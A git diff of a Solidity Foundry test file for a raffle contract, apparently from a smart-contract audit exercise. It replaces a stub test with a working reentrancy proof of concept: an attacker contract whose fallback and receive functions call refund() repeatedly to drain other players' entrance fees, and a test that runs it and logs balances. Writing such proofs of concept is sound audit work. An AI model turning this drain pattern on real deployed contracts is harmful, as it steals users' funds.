@@ -210,25 +210,63 @@ contract PuppyRaffleTest is Test {
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
 
-    function testReentranctyInRefund() public {
+    function test_ReentranctyInRefund() public {
         // arrange
-        // playerAddress must be in active players array;
-        puppyRaffle.enterRaffle({value: entranceFee})(playerOne);
-        bool inRaffle = puppyRaffle.players.length > 0;
-        console.log("Attacker in raffle? ", inRaffle);
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
 
-        // the getActivePlayerIndex function is exernal, the attacker (playerOne)has to call it
-        vm.prank(playerOne);
-        // uint256 playerIndex = getActivePlayerIndex(playerOne);
-        // we need to pass refund the playerIndex in the players array
-        // console.log("Player index: ", playerIndex);
-        // puppyRaffle.refund(playerIndex);
-        // act
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+        address attacker = makeAddr("attacker");
+        vm.deal(attacker, entranceFee);
+        uint256 attackerContractBalanceBefore = address(attackerContract).balance;
+        uint256 puppyRaffleContractBalanceBefore = address(puppyRaffle).balance;
 
-        // assert
+        // attack!  steal monnies!!!
+        vm.prank(attacker);
+        attackerContract.attack{value: entranceFee}();
+
+        console.log("starting attacker contract balance", attackerContractBalanceBefore);
+        console.log("starting puppyRaffle contract balance", puppyRaffleContractBalanceBefore);
+
+        console.log("attacker contract balance after attack", address(attackerContract).balance);
+        console.log("puppyRaffle contract balance after attack", address(puppyRaffle).balance);
+    }
+}
+
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
     }
 
-    // contract ReenterPuppyraffle (PuppyRaffle) {
+    function attack() external payable {
+        address[] memory players = new address[](1); //  this line and
+        players[0] = address(this); // this line are needed because the victim contract expexts an address array
+        puppyRaffle.enterRaffle{value: entranceFee}(players); // enter our players array into the raffle
+        // find our index in the raffle array
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
 
-    // }
+    function _stealMonnies() internal {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable {
+        _stealMonnies();
+    }
+
+    receive() external payable {
+        _stealMonnies();
+    }
 }
